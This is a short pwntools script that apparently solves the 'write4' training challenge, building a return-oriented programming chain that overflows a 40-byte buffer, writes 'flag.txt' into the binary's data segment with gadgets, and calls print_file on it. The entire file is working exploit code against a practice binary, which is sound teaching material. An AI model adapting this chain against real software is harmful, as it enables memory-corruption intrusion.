from pwn import *

context.arch = 'amd64'
p = process("./write4", stdin=PTY)
elf = ELF("./write4")
rop = ROP("./write4")

padding = cyclic(40)

data_segment = p64(elf.symbols["data_start"]) # readelf -s write4
flag_string = b"flag.txt"

pop_r14_pop_r15 = p64((rop.find_gadget(["pop r14", "pop r15", "ret"]))[0])
mov_ptr_r14_r15 = p64(0x400628)

pop_rdi = p64((rop.find_gadget(["pop rdi", "ret"]))[0])
print_file = p64(elf.symbols['print_file'])

pld = padding
pld += pop_r14_pop_r15 # to setup data addr & flag.txt in registers
pld += data_segment
pld += flag_string
pld += mov_ptr_r14_r15 # mov qword ptr [r14], r15 ; ret ==> to move flag.txt in data segment
pld += pop_rdi # to put the memory location of flag.txt in print_file() as argument
pld += data_segment
pld += print_file

p.sendline(pld)
p.interactive()
